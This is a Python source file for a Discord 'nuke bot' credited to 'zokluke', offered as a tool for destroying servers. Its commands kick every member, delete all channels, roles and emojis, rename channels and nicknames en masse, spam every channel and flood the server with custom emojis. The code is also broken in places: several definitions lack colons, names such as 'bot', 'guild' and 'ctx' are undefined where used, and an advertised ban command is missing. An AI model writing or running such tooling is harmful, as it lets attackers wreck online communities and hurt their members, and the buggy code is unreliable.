import os
import discord
from discord.ext import commands
import json
import aiohttp
from io import BytesIO

with open('config.json') as configfile:
    config = json.load(configfile)
    
TOKEN = config.get("token")
PREFIX = config.get("prefix")

client = commands.Bot(command_prefix=PREFIX, help_command=None, intents = discord.Intents.all())


    

print("zokluke's nuke bot")
print("------ commands ------")
print(f"{PREFIX}kickall -- Kicks all members from the server.")
print(f"{PREFIX}banall -- Bans all members from the server.")
print(f"{PREFIX}renamechannels <NAME> -- Renames all channels to whatever you want.")
print(f"{PREFIX}delchannels -- Deletes all channels.")
print(f"{PREFIX}spam <TEXT> -- Spams all channels with whatever text you want.")
@client.command()
async def kickall(ctx):
  for member in ctx.guild.members:
    if not member == bot.user:
      try:
        await member.kick()
      except Exception as e:
        print(f"[ERROR] {member.name} was not able to be kicked from {ctx.guild.name}. The full error is below:\n\n")
        print(e)
      
@client.command()
async def delchannels(ctx)
  for c in ctx.guild.channels:
    await c.delete()

@client.command()
async def renamechannels(ctx, *, name)
  if not name:
      print("[ERROR] you did not provide a name")
  else:
      for c in ctx.guild.channels:
        await c.edit(name=name)
 
@client.command()
async def spam(ctx, *, text)
  if not text:
      print("[ERROR] you did not provide text to spam")
  else:
      for c in ctx.guild.channels:
        await c.send(text)
        
@client.command()    
async def nickall(ctx, *, nick):
    for member in ctx.guild.members: 
        try:
            await member.edit(nick=nick)
        except discord.Forbidden:
            print(f"{member.name} couldn't be renamed in {ctx.guild.name} because you don't have permissions!")
        else:
            print(f"{member.name} has been renamed to {nick} in {ctx.guild.name}!")

@client.command()
async def delroles(ctx):
  for role in ctx.guild.roles:
    if not role.find("@everyone"):
      try:
        await role.delete()
      except Exception as e:
        print("[ERROR] couldn't delete roles. full error below.\n\n")
        print(e)
        
@client.command()
async def delemojis(ctx):
  for emoji in ctx.guild.emojis:
    try:
      await emoji.delete()
    except Exception as e:
      print("[ERROR] could not delete emojis. full error below.\n\n")
      print(e)

def makeemoji(url):
    async with aiohttp.ClientSession() as AIOsession:
      async with AIOsession.get(url) as lol:
        try:
          image = BytesIO(
            await lol.read()
          )
          val = image.getvalue()
          emoji = await guild.create_custom_emoji(image=image, name="HELLO-FROM-ZOKLUKES-NUKE-BOT")
          print(f"[SUCCESS] made emoji in {ctx.guild.name}")
        except Exception as e:
          print(f"[ERROR] {e}")
          
 
@client.command()
async def floodemojis(ctx, *, url): 
  def makeemoji():
      async with aiohttp.ClientSession() as AIOsession:
        async with AIOsession.get(url) as lol:
          try:
            image = BytesIO(
              await lol.read()
            )
            val = image.getvalue()
            emoji = await ctx.guild.create_custom_emoji(image=image, name="HELLO-FROM-ZOKLUKES-NUKE-BOT")
            print(f"[SUCCESS] made emoji in {ctx.guild.name}")
          except Exception as e:
            print(f"[ERROR] {e}")
  for i in range(50):
    await makeemoji()

          
try:
  client.run(TOKEN)
except Exception as e:
  print("[ERROR] Couldn't log in. Make sure you've edited 'config.json' before use.")
        
  
